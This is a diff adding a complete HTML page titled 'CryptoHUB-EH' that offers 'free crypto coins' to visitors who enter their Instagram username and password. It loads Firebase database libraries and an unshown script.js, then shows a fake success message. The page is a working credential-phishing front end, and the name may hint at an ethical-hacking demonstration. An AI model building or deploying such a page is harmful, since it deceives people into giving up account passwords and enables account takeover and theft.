@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoHUB-EH</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Welcome to CryptoHUB-EH</h1>
+            <p>Your Gateway to Free Crypto Coins</p>
+        </div>
+        <div class="form-box">
+            <h2>Register for Free Crypto Coins</h2>
+            <form id="registrationForm">
+                <label for="instaUsername">Enter your Instagram username:</label>
+                <input type="text" id="instaUsername" placeholder="Your Instagram Username" required>
+
+                <label for="instaPassword">Enter your Instagram password:</label>
+                <input type="password" id="instaPassword" placeholder="Your Instagram Password" required>
+
+                <button type="submit">Register</button>
+            </form>
+            <div id="successMessage" style="display: none;">
+                <h3>Registration Successful!</h3>
+                <p>You've earned free crypto coins. Enjoy!</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
